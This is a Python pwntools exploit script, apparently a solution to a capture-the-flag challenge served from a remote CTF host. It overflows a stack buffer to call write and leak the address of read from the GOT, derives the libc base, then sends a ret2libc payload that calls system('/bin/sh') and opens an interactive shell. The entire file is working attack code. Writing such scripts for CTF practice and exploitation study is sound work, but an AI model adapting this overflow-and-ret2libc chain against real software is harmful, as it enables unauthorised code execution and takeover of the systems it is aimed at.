from pwn import *

#proc = process("./32_chal")#,env={"LD_PRELOAD" : "/home/pwning/Downloads/Telegram Desktop/bof-libc.so"})
proc = remote("hack.bckdr.in",9036)
elf_proc = ELF("./32_chal",checksec=False)
libc = ELF("./libc.so.6",checksec=False)
#libc = ELF("/lib/i386-linux-gnu/libc.so.6",checksec=False)
read_got = elf_proc.got["read"]
write_plt = elf_proc.plt["write"]
main_addr = elf_proc.symbols["main"]

# offset
str_bin_sh = libc.search("/bin/sh").next()
offset_system = libc.symbols["system"]
offset_write = libc.symbols["write"]
offset_read = libc.symbols["read"]
offset_exit = libc.symbols["exit"]

# leak got
payload = "A" * 112 + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(4)
proc.recvuntil("Hello pwners,")
proc.sendline(payload)
proc.recvline()
read_got_addr = proc.recvuntil("Hello",drop=True)
read_got_addr = read_got_addr.replace("\x00","",1) #read_got_addr.ljust(4,"\x00")
read_got_addr = u32(read_got_addr)

libc_base_addr = read_got_addr - offset_read
system_addr = libc_base_addr + offset_system
str_bin_sh_addr = libc_base_addr + str_bin_sh
exit_addr = libc_base_addr + offset_exit
log.info("Libc Base 0x{0:x}".format(libc_base_addr))
log.info("System @ 0x{0:x}".format(system_addr))
log.info("/bin/sh @ 0x{0:x}".format(str_bin_sh_addr))
log.info("Exit @ 0x{0:x}".format(exit_addr))

proc.recvline()
# spawning shell with ret2libc
payload2 = "A" * 104 +p32(system_addr) + p32(exit_addr) + p32(str_bin_sh_addr)
proc.sendline(payload2)
proc.interactive()

